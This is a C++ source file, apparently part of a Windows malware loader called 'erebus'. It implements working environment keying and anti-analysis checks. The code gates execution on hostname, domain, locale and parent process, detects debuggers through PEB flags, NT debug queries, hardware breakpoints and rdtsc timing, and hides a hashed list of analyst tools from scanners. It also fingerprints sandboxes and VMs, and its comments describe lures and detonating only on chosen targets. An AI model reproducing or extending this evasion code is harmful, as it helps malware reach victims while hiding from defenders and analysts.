#define _WIN32_WINNT _WIN32_WINNT_VISTA
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include "../../include/guardrails/guardrails.hpp"
#include "../../include/loader.hpp"

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "netapi32.lib")

// NetGetJoinInformation / NetApiBufferFree are declared manually rather
// than via <lmjoin.h> / <lmapibuf.h> because loader.hpp already provides a
// local typedef for NETSETUP_JOIN_STATUS and pulling in the MinGW headers
// produces a conflicting-declaration error. NERR_Success = 0.
#ifndef NERR_Success
#define NERR_Success 0
#endif
extern "C" {
    DWORD __stdcall NetGetJoinInformation(
        LPCWSTR lpServer,
        LPWSTR* lpNameBuffer,
        PNETSETUP_JOIN_STATUS BufferType
    );
    DWORD __stdcall NetApiBufferFree(LPVOID Buffer);
}

namespace erebus {
namespace guardrails {

// String comparison helper (case-insensitive)
static bool StrEqualI(const char* a, const char* b) {
    if (!a || !b) return false;
    while (*a && *b) {
        char ca = (*a >= 'A' && *a <= 'Z') ? (*a + 32) : *a;
        char cb = (*b >= 'A' && *b <= 'Z') ? (*b + 32) : *b;
        if (ca != cb) return false;
        a++; b++;
    }
    return *a == *b;
}

// String prefix check for IP subnet matching
static bool StrStartsWith(const char* str, const char* prefix) {
    if (!str || !prefix) return false;
    while (*prefix) {
        if (*str != *prefix) return false;
        str++; prefix++;
    }
    return true;
}

GuardrailConfig GetDefaultConfig() {
    GuardrailConfig config = {};
    config.allowed_hostnames = nullptr;
    config.blocked_hostnames = nullptr;
    config.hostname_count_allowed = 0;
    config.hostname_count_blocked = 0;
    
    config.allowed_usernames = nullptr;
    config.blocked_usernames = nullptr;
    config.username_count_allowed = 0;
    config.username_count_blocked = 0;
    
    config.allowed_domains = nullptr;
    config.blocked_domains = nullptr;
    config.domain_count_allowed = 0;
    config.domain_count_blocked = 0;
    
    config.allowed_ips = nullptr;
    config.blocked_ips = nullptr;
    config.ip_count_allowed = 0;
    config.ip_count_blocked = 0;
    
    config.check_debugger_present = false;
    config.check_remote_debugger = false;
    config.check_debugger_processes = false;
    config.check_hardware_breakpoints = false;
    config.check_timing_checks = false;
    config.check_sandbox_environment = false;

    config.check_domain_joined = false;
    config.allowed_parents = nullptr;
    config.parent_count_allowed = 0;
    config.allowed_locales = nullptr;
    config.locale_count_allowed = 0;

    return config;
}

CheckResult RunGuardrails(const GuardrailConfig& config) {
    CheckResult result;
    
    // Hostname checks
    if (config.allowed_hostnames || config.blocked_hostnames) {
        result = CheckHostname(config.allowed_hostnames, config.hostname_count_allowed,
                              config.blocked_hostnames, config.hostname_count_blocked);
        if (!result.passed) return result;
    }
    
    // Username checks
    if (config.allowed_usernames || config.blocked_usernames) {
        result = CheckUsername(config.allowed_usernames, config.username_count_allowed,
                              config.blocked_usernames, config.username_count_blocked);
        if (!result.passed) return result;
    }
    
    // Domain checks
    if (config.allowed_domains || config.blocked_domains) {
        result = CheckDomain(config.allowed_domains, config.domain_count_allowed,
                           config.blocked_domains, config.domain_count_blocked);
        if (!result.passed) return result;
    }
    
    // IP address checks
    if (config.allowed_ips || config.blocked_ips) {
        result = CheckIPAddress(config.allowed_ips, config.ip_count_allowed,
                               config.blocked_ips, config.ip_count_blocked);
        if (!result.passed) return result;
    }
    
    // Anti-debugging checks
    if (config.check_debugger_present) {
        result = CheckDebuggerPresent();
        if (!result.passed) return result;
    }
    
    if (config.check_remote_debugger) {
        result = CheckRemoteDebugger();
        if (!result.passed) return result;
    }
    
    if (config.check_debugger_processes) {
        result = CheckDebuggerProcesses();
        if (!result.passed) return result;
    }
    
    if (config.check_hardware_breakpoints) {
        result = CheckHardwareBreakpoints();
        if (!result.passed) return result;
    }
    
    if (config.check_timing_checks) {
        result = CheckTimingAnomaly();
        if (!result.passed) return result;
    }

    if (config.check_sandbox_environment) {
        result = CheckSandboxEnvironment();
        if (!result.passed) return result;
    }

    if (config.check_domain_joined) {
        result = CheckDomainJoined();
        if (!result.passed) return result;
    }

    if (config.allowed_parents && config.parent_count_allowed > 0) {
        result = CheckParentProcess(config.allowed_parents, config.parent_count_allowed);
        if (!result.passed) return result;
    }

    if (config.allowed_locales && config.locale_count_allowed > 0) {
        result = CheckLocale(config.allowed_locales, config.locale_count_allowed);
        if (!result.passed) return result;
    }

    // All checks passed
    result.passed = true;
    result.reason = "All guardrail checks passed";
    return result;
}

// ---------------------------------------------------------------------------
// CheckDomainJoined: NetGetJoinInformation returns NetSetupDomainName on
// domain-joined hosts. Standalone sandboxes and analyst VMs almost never
// mirror the target's AD topology, so this is one of the cheapest and
// highest-signal guardrails available. One netapi32 call, no network IO.
// ---------------------------------------------------------------------------
CheckResult CheckDomainJoined() {
    CheckResult result = { false, "domain-join check failed" };
    LPWSTR buffer = nullptr;
    NETSETUP_JOIN_STATUS status = NetSetupUnknownStatus;
    if (NetGetJoinInformation(nullptr, &buffer, &status) == NERR_Success) {
        if (buffer) NetApiBufferFree(buffer);
        if (status == NetSetupDomainName) {
            result.passed = true;
            result.reason = "host is domain-joined";
            return result;
        }
        result.reason = "host is not domain-joined";
        return result;
    }
    return result;
}

// ---------------------------------------------------------------------------
// CheckParentProcess: walk the snapshot, find our parent PID, then compare
// its image name (leaf only, case-insensitive) against the allowlist. This
// catches sandbox harnesses that spawn samples from cmd/rundll32/python
// rather than the expected lure context (explorer.exe for ISO payloads,
// winword.exe for macros, etc.).
// ---------------------------------------------------------------------------
static DWORD GetParentPid(DWORD selfPid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = {};
    pe.dwSize = sizeof(pe);
    DWORD parent = 0;
    if (Process32First(snap, &pe)) {
        do {
            if (pe.th32ProcessID == selfPid) {
                parent = pe.th32ParentProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return parent;
}

static bool GetProcessLeafName(DWORD pid, char* out, DWORD outSize) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32 pe = {};
    pe.dwSize = sizeof(pe);
    bool found = false;
    if (Process32First(snap, &pe)) {
        do {
            if (pe.th32ProcessID == pid) {
                // szExeFile is already the leaf image name (A/W depending
                // on build config).
                DWORD i = 0;
                for (; i < outSize - 1 && pe.szExeFile[i]; ++i) out[i] = (char)pe.szExeFile[i];
                out[i] = '\0';
                found = true;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

CheckResult CheckParentProcess(const char** allowed, int allowed_count) {
    CheckResult result = { false, "parent process check failed" };
    DWORD parent = GetParentPid(GetCurrentProcessId());
    if (!parent) return result;
    char name[MAX_PATH] = {};
    if (!GetProcessLeafName(parent, name, sizeof(name))) return result;
    for (int i = 0; i < allowed_count; ++i) {
        if (StrEqualI(name, allowed[i])) {
            result.passed = true;
            result.reason = "parent process matched allowlist";
            return result;
        }
    }
    result.reason = "parent process not in allowlist";
    return result;
}

// ---------------------------------------------------------------------------
// CheckLocale: format the user's default LCID as 4-digit lowercase hex and
// compare against the allowlist. Cheap targeting check - if the operator
// only wants to detonate on hosts with a specific regional setting (e.g.
// targeting a financial institution in a specific country), this blocks
// sandboxes and analyst VMs configured with en-US defaults.
// ---------------------------------------------------------------------------
static void FormatLcidHex(LCID lcid, char* out /*>=5*/) {
    const char* digits = "0123456789abcdef";
    unsigned v = (unsigned)(lcid & 0xFFFF);
    out[0] = digits[(v >> 12) & 0xF];
    out[1] = digits[(v >> 8) & 0xF];
    out[2] = digits[(v >> 4) & 0xF];
    out[3] = digits[v & 0xF];
    out[4] = '\0';
}

CheckResult CheckLocale(const char** allowed, int allowed_count) {
    CheckResult result = { false, "locale check failed" };
    LCID lcid = GetUserDefaultLCID();
    char hex[8] = {};
    FormatLcidHex(lcid, hex);
    for (int i = 0; i < allowed_count; ++i) {
        if (StrEqualI(hex, allowed[i])) {
            result.passed = true;
            result.reason = "locale matched allowlist";
            return result;
        }
    }
    result.reason = "locale not in allowlist";
    return result;
}

void GetComputerNameString(char* buffer, DWORD bufferSize) {
    if (!buffer || bufferSize == 0) return;
    
    DWORD size = bufferSize;
    if (!GetComputerNameA(buffer, &size)) {
        buffer[0] = '\0';
    }
}

void GetUsernameString(char* buffer, DWORD bufferSize) {
    if (!buffer || bufferSize == 0) return;
    
    DWORD size = bufferSize;
    if (!GetUserNameA(buffer, &size)) {
        buffer[0] = '\0';
    }
}

void GetDomainString(char* buffer, DWORD bufferSize) {
    if (!buffer || bufferSize == 0) return;
    
    DWORD size = bufferSize;
    if (!GetComputerNameExA(ComputerNameDnsDomain, buffer, &size)) {
        // Fallback to workgroup name
        buffer[0] = '\0';
    }
}

void GetLocalIPAddress(char* buffer, DWORD bufferSize) {
    if (!buffer || bufferSize == 0) return;
    buffer[0] = '\0';
    
    // Get adapter addresses
    ULONG outBufLen = 15000;
    PIP_ADAPTER_ADDRESSES pAddresses = (IP_ADAPTER_ADDRESSES*)::HeapAlloc(::GetProcessHeap(), 0, outBufLen);
    if (!pAddresses) return;
    
    ULONG flags = GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_DNS_SERVER;
    DWORD ret = GetAdaptersAddresses(AF_INET, flags, NULL, pAddresses, &outBufLen);
    
    if (ret == NO_ERROR) {
        PIP_ADAPTER_ADDRESSES pCurrAddresses = pAddresses;
        while (pCurrAddresses) {
            if (pCurrAddresses->OperStatus == IfOperStatusUp) {
                PIP_ADAPTER_UNICAST_ADDRESS pUnicast = pCurrAddresses->FirstUnicastAddress;
                if (pUnicast) {
                    SOCKADDR_IN* sockaddr_ipv4 = (SOCKADDR_IN*)pUnicast->Address.lpSockaddr;
                    if (sockaddr_ipv4->sin_family == AF_INET) {
                        inet_ntop(AF_INET, &(sockaddr_ipv4->sin_addr), buffer, bufferSize);
                        // Skip loopback
                        if (!StrStartsWith(buffer, "127.")) {
                            break;
                        }
                    }
                }
            }
            pCurrAddresses = pCurrAddresses->Next;
        }
    }
    
    HeapFree(GetProcessHeap(), 0, pAddresses);
}

CheckResult CheckHostname(const char** allowed, int allowed_count, 
                         const char** blocked, int blocked_count) {
    CheckResult result;
    char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    GetComputerNameString(hostname, sizeof(hostname));
    
    // Check blocked list first
    if (blocked && blocked_count > 0) {
        for (int i = 0; i < blocked_count; i++) {
            if (StrEqualI(hostname, blocked[i])) {
                result.passed = false;
                result.reason = "Hostname is blocked";
                return result;
            }
        }
    }
    
    // Check allowed list (if specified, hostname MUST be in list)
    if (allowed && allowed_count > 0) {
        bool found = false;
        for (int i = 0; i < allowed_count; i++) {
            if (StrEqualI(hostname, allowed[i])) {
                found = true;
                break;
            }
        }
        if (!found) {
            result.passed = false;
            result.reason = "Hostname not in allowed list";
            return result;
        }
    }
    
    result.passed = true;
    result.reason = "Hostname check passed";
    return result;
}

CheckResult CheckUsername(const char** allowed, int allowed_count, 
                         const char** blocked, int blocked_count) {
    CheckResult result;
    char username[256] = {0};
    GetUsernameString(username, sizeof(username));
    
    // Check blocked list first
    if (blocked && blocked_count > 0) {
        for (int i = 0; i < blocked_count; i++) {
            if (StrEqualI(username, blocked[i])) {
                result.passed = false;
                result.reason = "Username is blocked";
                return result;
            }
        }
    }
    
    // Check allowed list
    if (allowed && allowed_count > 0) {
        bool found = false;
        for (int i = 0; i < allowed_count; i++) {
            if (StrEqualI(username, allowed[i])) {
                found = true;
                break;
            }
        }
        if (!found) {
            result.passed = false;
            result.reason = "Username not in allowed list";
            return result;
        }
    }
    
    result.passed = true;
    result.reason = "Username check passed";
    return result;
}

CheckResult CheckDomain(const char** allowed, int allowed_count, 
                       const char** blocked, int blocked_count) {
    CheckResult result;
    char domain[256] = {0};
    GetDomainString(domain, sizeof(domain));
    
    // Check blocked list first
    if (blocked && blocked_count > 0) {
        for (int i = 0; i < blocked_count; i++) {
            if (StrEqualI(domain, blocked[i])) {
                result.passed = false;
                result.reason = "Domain is blocked";
                return result;
            }
        }
    }
    
    // Check allowed list
    if (allowed && allowed_count > 0) {
        bool found = false;
        for (int i = 0; i < allowed_count; i++) {
            if (StrEqualI(domain, allowed[i])) {
                found = true;
                break;
            }
        }
        if (!found) {
            result.passed = false;
            result.reason = "Domain not in allowed list";
            return result;
        }
    }
    
    result.passed = true;
    result.reason = "Domain check passed";
    return result;
}

CheckResult CheckIPAddress(const char** allowed, int allowed_count, 
                          const char** blocked, int blocked_count) {
    CheckResult result;
    char ipaddr[64] = {0};
    GetLocalIPAddress(ipaddr, sizeof(ipaddr));
    
    // Check blocked list first
    if (blocked && blocked_count > 0) {
        for (int i = 0; i < blocked_count; i++) {
            // Simple string prefix match for subnets (e.g., "192.168.")
            if (StrStartsWith(ipaddr, blocked[i]) || StrEqualI(ipaddr, blocked[i])) {
                result.passed = false;
                result.reason = "IP address is blocked";
                return result;
            }
        }
    }
    
    // Check allowed list
    if (allowed && allowed_count > 0) {
        bool found = false;
        for (int i = 0; i < allowed_count; i++) {
            if (StrStartsWith(ipaddr, allowed[i]) || StrEqualI(ipaddr, allowed[i])) {
                found = true;
                break;
            }
        }
        if (!found) {
            result.passed = false;
            result.reason = "IP address not in allowed list";
            return result;
        }
    }
    
    result.passed = true;
    result.reason = "IP address check passed";
    return result;
}

CheckResult CheckDebuggerPresent() {
    CheckResult result;

    // Layer 1: IsDebuggerPresent (easily patched, but catches lazy debuggers).
    if (IsDebuggerPresent()) {
        result.passed = false;
        result.reason = "Debugger detected (IsDebuggerPresent)";
        return result;
    }

    // Layer 2: direct PEB reads. Bypasses any user-mode hook on
    // IsDebuggerPresent and covers flags that IsDebuggerPresent ignores.
    #ifdef _WIN64
        PPEB peb = (PPEB)__readgsqword(0x60);
    #else
        PPEB peb = (PPEB)__readfsdword(0x30);
    #endif

    if (!peb) {
        result.passed = true;
        result.reason = "PEB unavailable";
        return result;
    }

    if (peb->BeingDebugged) {
        result.passed = false;
        result.reason = "Debugger detected (PEB.BeingDebugged)";
        return result;
    }

    // PEB.NtGlobalFlag: when a debugger launches a process, the loader sets
    // FLG_HEAP_ENABLE_TAIL_CHECK (0x10) | FLG_HEAP_ENABLE_FREE_CHECK (0x20) |
    // FLG_HEAP_VALIDATE_PARAMETERS (0x40). A normally-started process has
    // these bits clear. Attackers who flip BeingDebugged almost always
    // forget NtGlobalFlag.
    ULONG ntGlobalFlag = peb->NtGlobalFlag;
    if (ntGlobalFlag & (FLG_HEAP_ENABLE_TAIL_CHECK |
                        FLG_HEAP_ENABLE_FREE_CHECK |
                        FLG_HEAP_VALIDATE_PARAMETERS)) {
        result.passed = false;
        result.reason = "Debugger detected (PEB.NtGlobalFlag heap flags)";
        return result;
    }

    result.passed = true;
    result.reason = "No debugger detected";
    return result;
}

CheckResult CheckRemoteDebugger() {
    CheckResult result;

    typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
        HANDLE ProcessHandle,
        PROCESSINFOCLASS ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength,
        PULONG ReturnLength
    );

    HMODULE hNtdll = ImportModule("ntdll.dll");
    if (!hNtdll) {
        result.passed = true;
        result.reason = "Unable to check remote debugger";
        return result;
    }

    ImportFunction(hNtdll, NtQueryInformationProcess, pNtQueryInformationProcess);
    if (!NtQueryInformationProcess) {
        result.passed = true;
        result.reason = "NtQueryInformationProcess unresolved";
        return result;
    }

    HANDLE self = GetCurrentProcess();

    // Query 1: ProcessDebugPort (info class 7). Non-zero port means a
    // user-mode debugger is attached (cdb, x64dbg, WinDbg, etc.).
    DWORD_PTR debugPort = 0;
    NTSTATUS status = NtQueryInformationProcess(
        self, ProcessDebugPort, &debugPort, sizeof(debugPort), NULL);
    if (NT_SUCCESS(status) && debugPort != 0) {
        result.passed = false;
        result.reason = "Remote debugger detected (ProcessDebugPort)";
        return result;
    }

    // Query 2: ProcessDebugObjectHandle (info class 30). Kernel debuggers
    // and modern attach paths expose a debug-object handle even when the
    // legacy port is zero. Non-NULL handle = debugged.
    HANDLE debugObject = NULL;
    status = NtQueryInformationProcess(
        self, ProcessDebugObjectHandle, &debugObject, sizeof(debugObject), NULL);
    if (NT_SUCCESS(status) && debugObject != NULL) {
        result.passed = false;
        result.reason = "Remote debugger detected (ProcessDebugObjectHandle)";
        return result;
    }

    // Query 3: ProcessDebugFlags (info class 31). The kernel returns the
    // *inverse* of EPROCESS.NoDebugInherit; a value of 0 means the process
    // is being debugged. Catches detachers that leave the flag behind.
    ULONG debugFlags = 0;
    status = NtQueryInformationProcess(
        self, ProcessDebugFlags, &debugFlags, sizeof(debugFlags), NULL);
    if (NT_SUCCESS(status) && debugFlags == 0) {
        result.passed = false;
        result.reason = "Remote debugger detected (ProcessDebugFlags)";
        return result;
    }

    result.passed = true;
    result.reason = "No remote debugger detected";
    return result;
}

CheckResult CheckDebuggerProcesses() {
    CheckResult result;

    // Hashed debugger/analysis process list. Each entry is a compile-time
    // FNV1a hash via H(); the string literals never reach .rdata under -O2
    // because the hash is forced through a template non-type parameter.
    // At runtime, ProcessGetPidFromHashedListEx walks NtQuerySystemInformation
    // results and hashes each image name for comparison - no string match,
    // no contiguous name array for scanners to fingerprint.
    static DWORD debugger_hashes[] = {
        H("x64dbg.exe"),
        H("x32dbg.exe"),
        H("x96dbg.exe"),
        H("windbg.exe"),
        H("ollydbg.exe"),
        H("immunitydebugger.exe"),
        H("ida.exe"),
        H("ida64.exe"),
        H("idag.exe"),
        H("idag64.exe"),
        H("idaw.exe"),
        H("idaw64.exe"),
        H("idaq.exe"),
        H("idaq64.exe"),
        H("idau.exe"),
        H("idau64.exe"),
        H("radare2.exe"),
        H("scylla.exe"),
        H("scylla_x64.exe"),
        H("scylla_x86.exe"),
        H("protection_id.exe"),
        H("importrec.exe"),
        H("megadumper.exe"),
        H("lordpe.exe"),
        H("reshacker.exe"),
        H("resourcehacker.exe"),
        H("devenv.exe"),            // Visual Studio
        H("dnspy.exe"),
        H("dnspy-x86.exe"),
        H("dnspyex.exe"),
        H("dotpeek.exe"),
        H("ilspy.exe"),
        H("de4dot.exe"),
        H("jetbrains.rider.exe"),
        H("fiddler.exe"),
        H("fiddler everywhere.exe"),
        H("charles.exe"),
        H("burpsuite.exe"),
        H("wireshark.exe"),
        H("dumpcap.exe"),
        H("tcpdump.exe"),
        H("processhacker.exe"),
        H("procmon.exe"),
        H("procmon64.exe"),
        H("procexp.exe"),
        H("procexp64.exe"),
        H("autoruns.exe"),
        H("autorunsc.exe"),
    };

    DWORD pid = erebus::ProcessGetPidFromHashedList(
        debugger_hashes,
        sizeof(debugger_hashes) / sizeof(debugger_hashes[0]));

    if (pid != 0) {
        result.passed = false;
        result.reason = "Debugger process detected";
        return result;
    }

    result.passed = true;
    result.reason = "No debugger processes detected";
    return result;
}

CheckResult CheckHardwareBreakpoints() {
    CheckResult result;

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        // A hardware breakpoint is "live" only when both the Drn address
        // register is populated AND the matching local / global enable bit
        // is set in Dr7. Checking Drn != 0 alone produces false positives
        // from stale values that a previous debugger left behind, and can
        // be bypassed by an attacker who sets Dr0-Dr3 without enabling
        // them in Dr7 (then re-arms Dr7 at execution time via another
        // thread).
        //
        // Dr7 enable-bit layout:
        //   bits 0,1 -> Dr0 (L0 | G0)
        //   bits 2,3 -> Dr1 (L1 | G1)
        //   bits 4,5 -> Dr2 (L2 | G2)
        //   bits 6,7 -> Dr3 (L3 | G3)
        bool dr0_active = (ctx.Dr0 != 0) && ((ctx.Dr7 & 0x3)  != 0);
        bool dr1_active = (ctx.Dr1 != 0) && ((ctx.Dr7 & 0xC)  != 0);
        bool dr2_active = (ctx.Dr2 != 0) && ((ctx.Dr7 & 0x30) != 0);
        bool dr3_active = (ctx.Dr3 != 0) && ((ctx.Dr7 & 0xC0) != 0);

        if (dr0_active || dr1_active || dr2_active || dr3_active) {
            result.passed = false;
            result.reason = "Hardware breakpoints detected";
            return result;
        }
    }

    result.passed = true;
    result.reason = "No hardware breakpoints detected";
    return result;
}

CheckResult CheckTimingAnomaly() {
    CheckResult result;

    // Two back-to-back rdtsc reads around a tight arithmetic loop. On bare
    // metal / a normal VM this completes in a few thousand cycles; under
    // single-step or instruction-level tracing it balloons by >10x because
    // every iteration costs a VM exit / debugger round-trip.
    //
    // We deliberately DO NOT use Sleep() here. Sleep-based checks are easy
    // for a debugger user to defeat by setting "skip sleeps" or by patching
    // NtDelayExecution, and the surrounding Sleep() call itself shows up in
    // static analysis as an anti-analysis hint. Pure rdtsc is silent.
    volatile ULONG sink = 0;
    DWORD64 start = __rdtsc();
    for (int i = 0; i < 2048; i++) {
        sink += (ULONG)(i * 0x9E3779B1u);
    }
    DWORD64 end = __rdtsc();
    DWORD64 elapsed = end - start;
    (void)sink;

    // Threshold: ~200k cycles on a modern CPU is already pessimistic for
    // 2048 iterations of a single MUL+ADD. Anything above 2M strongly
    // suggests single-step or heavy instrumentation.
    if (elapsed > 2000000ULL) {
        result.passed = false;
        result.reason = "Timing anomaly detected (possible debugger)";
        return result;
    }

    result.passed = true;
    result.reason = "No timing anomalies detected";
    return result;
}

bool CheckIfDebugged() {
    // Master check that runs all anti-debug checks
    if (!CheckDebuggerPresent().passed) return true;
    if (!CheckRemoteDebugger().passed) return true;
    if (!CheckHardwareBreakpoints().passed) return true;
    if (!CheckDebuggerProcesses().passed) return true;
    if (!CheckTimingAnomaly().passed) return true;

    return false;
}

// ================================================================
// Sandbox / VM environment detection
// ================================================================

CheckResult CheckSandboxEnvironment() {
    CheckResult result;
    result.passed = true;
    result.reason = nullptr;

    // --- Check 1: Low resource counts (< 2 CPU cores, < 2 GB RAM) ---
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) {
        result.passed = false;
        result.reason = "Low processor count";
        return result;
    }

    MEMORYSTATUSEX mem = {};
    mem.dwLength = sizeof(mem);
    if (GlobalMemoryStatusEx(&mem)) {
        // Less than 2 GB of physical RAM
        if (mem.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) {
            result.passed = false;
            result.reason = "Low physical memory";
            return result;
        }
    }

    // --- Check 2: Small disk (< 60 GB) ---
    ULARGE_INTEGER totalBytes = {};
    if (GetDiskFreeSpaceExA("C:\\", nullptr, &totalBytes, nullptr)) {
        if (totalBytes.QuadPart < (60ULL * 1024 * 1024 * 1024)) {
            result.passed = false;
            result.reason = "Small disk size";
            return result;
        }
    }

    // --- Check 3: Hypervisor presence via CPUID ---
    // CPUID leaf 1, ECX bit 31 = hypervisor present
#ifdef _MSC_VER
    int cpuInfo[4] = {};
    __cpuid(cpuInfo, 1);
    if (cpuInfo[2] & (1 << 31)) {
        result.passed = false;
        result.reason = "Hypervisor detected";
        return result;
    }
#else
    unsigned int eax, ebx, ecx, edx;
    __asm__ __volatile__(
        "cpuid"
        : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
        : "a"(1)
    );
    if (ecx & (1 << 31)) {
        result.passed = false;
        result.reason = "Hypervisor detected";
        return result;
    }
#endif

    // --- Check 4: Known sandbox filenames ---
    const char* sandboxFiles[] = {
        "C:\\agent\\agent.pyw",          // Cuckoo agent
        "C:\\sandbox\\starter.exe",      // Generic sandbox
        "C:\\analysis\\start.bat",       // Analysis VM
    };
    for (int i = 0; i < sizeof(sandboxFiles) / sizeof(sandboxFiles[0]); i++) {
        DWORD attrs = GetFileAttributesA(sandboxFiles[i]);
        if (attrs != INVALID_FILE_ATTRIBUTES) {
            result.passed = false;
            result.reason = "Sandbox artifact detected";
            return result;
        }
    }

    // --- Check 5: Recent user activity (no recent files = sandbox) ---
    // Check if Recent folder has > 5 items (sandboxes are freshly provisioned)
    WIN32_FIND_DATAA fd;
    char recentPath[MAX_PATH];
    if (SUCCEEDED(GetEnvironmentVariableA("APPDATA", recentPath, MAX_PATH))) {
        strcat_s(recentPath, MAX_PATH, "\\Microsoft\\Windows\\Recent\\*");
        HANDLE hFind = FindFirstFileA(recentPath, &fd);
        if (hFind != INVALID_HANDLE_VALUE) {
            int fileCount = 0;
            do { fileCount++; } while (FindNextFileA(hFind, &fd) && fileCount < 10);
            FindClose(hFind);
            if (fileCount < 5) {
                result.passed = false;
                result.reason = "No recent user activity";
                return result;
            }
        }
    }

    return result;
}

} // namespace guardrails
} // namespace erebus
